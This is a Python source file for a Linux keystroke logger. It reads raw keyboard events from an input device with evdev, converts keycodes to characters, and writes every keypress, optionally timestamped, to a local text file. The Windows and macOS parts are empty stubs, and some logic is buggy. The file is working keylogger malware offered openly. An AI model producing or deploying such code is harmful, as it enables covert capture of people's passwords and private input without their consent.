import platform
import evdev
import os
import datetime
        
class Linux():
    device = evdev.InputDevice('/dev/input/event3')
    
    def __init__(self,filePath):
        self.file = filePath
    
    def Key_Pressed(self): 
        
        for event in Linux.device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                key_event=(evdev.categorize(event))
                # print(key_event.keycode) # Delete line after 
                return key_event.keycode,key_event.keystate

    def Key_txt(self):
        
        k = self.Key_Pressed()
        print(k)
        
        if k[0] == "LEFTSHIFT" or k[0] == "RIGHTSHIFT" and k[1] == 0:
            SpecialSymbols = {
                "LEFTBRACE":"{",
                "RIGHTBRACE":"}",
                "MINUS": "_",
                "EQUAL":"+",
                "BACKSLASH" : "|",
                "SEMICOLON" : ":",
                "APOSTROPHE" : '"',
                "COMMA":"<",
                "DOT":">",
                "SLASH":"?",
                "GRAVE":"~",
                
                "KP1":"1",
                "KP2":"2",
                "KP3":"3",
                "KP4":"4",
                "KP5":"5",
                "KP6":"6",
                "KP7":"7",
                "KP8":"8",
                "KP9":"9",
                "KP0":"0",
                
                "KPSLASH":"/",
                "KPMINUS":"-",
                "KPPLUS":"+",
                "KPENTER":" ",
                "KPDOT":".",
                "KPASTERISK":"*", 
                
                "ENTER":"\n",
                "SPACE":" ",
                "TAB": "    "
            }
            SpecialKey = ("LEFTCTRL","CAPSLOCK","ESC","LEFTALT","RIGHTALT","NUMLOCK","LEFT","RIGHT","SYSRQT","LEFTMETA","INSERT","PREVIOUSSONG","NEXTSONG","PLAYPAUSE","VOLUMEDOWN","VOLLUMEUP","F5","UP","DOWN")
            
        else:
            SpecialSymbols = {
                "LEFTBRACE":"[",
                "RIGHTBRACE":"]",
                "MINUS": "-",
                "EQUAL":"=",
                "BACKSLASH" : "\\",
                "SEMICOLON" : ";",
                "APOSTROPHE" : "'",
                "COMMA":",",
                "DOT":".",
                "SLASH":"/",
                "GRAVE":"`",
                
                "KP1":"1",
                "KP2":"2",
                "KP3":"3",
                "KP4":"4",
                "KP5":"5",
                "KP6":"6",
                "KP7":"7",
                "KP8":"8",
                "KP9":"9",
                "KP0":"0",
                
                "KPSLASH":"/",
                "KPMINUS":"-",
                "KPPLUS":"+",
                "KPENTER":" ",
                "KPDOT":".",
                "KPASTERISK":"*", 
                
                "ENTER":"\n",
                "SPACE":" ",
                "TAB": "    "
                }
            SpecialKey = ("LEFTCTRL","CAPSLOCK","RIGHTSHIFT","LEFTSHIFT","ESC","LEFTALT","RIGHTALT","NUMLOCK","LEFT","RIGHT","SYSRQT","LEFTMETA","INSERT","PREVIOUSSONG","NEXTSONG","PLAYPAUSE","VOLUMEDOWN","VOLLUMEUP","F5","UP","DOWN")

        
        if k[1] !=1:
            k = k[0][4:]
            
            if k in SpecialKey:
                return "","a"
            
            elif k in SpecialSymbols:
                k_=SpecialSymbols.get(k)
                return k_,"a"
            
            elif k == "BACKSPACE":
                data = open(self.file,"r")
                m = data.read()
                km = m[:-1]
                
                return km,"w"
                
            return k,"a"
        
        return "","a"
        
def Darwin():
    pass

def Windows():
    pass


def run_current_platform(filepath):    
    if platform.system() == "Windows":
        Key = Windows(filepath)
        
    elif platform.system() == "Linux":
        Key = Linux(filepath)
        
    elif platform.system() == "Darwin":
        Key = Darwin(filepath)

    return Key


def logfile(file_path):  # provide file path  | 
    while True :
        log_Entry = run_current_platform(file_path)
        if os.path.exists(file_path):
            file = open(file_path,"a")
            data = str(log_Entry.Key_Pressed())+" "+str(datetime.datetime.now())+"\n"
            file.write(data)
        
        else :
            file = open(file_path,"w")
            file.write(log_Entry.Key_Pressed()+str(datetime.datetime.now()))        


def textfile(file_path):  # provide file path  | 
    
    while True :
        
        log_Entry = run_current_platform(file_path)
        if os.path.exists(file_path):
            data = log_Entry.Key_txt() 
            opentype = data[1]     
            file = open(file_path,opentype)
            file.write(data[0])
        
        else :
            data = log_Entry.Key_txt()
            file = open(file_path,data[1])
            file.write(data[0])        

def main():
        
    textfile("Demo.txt")
    # Obj = Linux()
    
    # Obj.Key_txt()

if __name__ == '__main__':
    main()
    
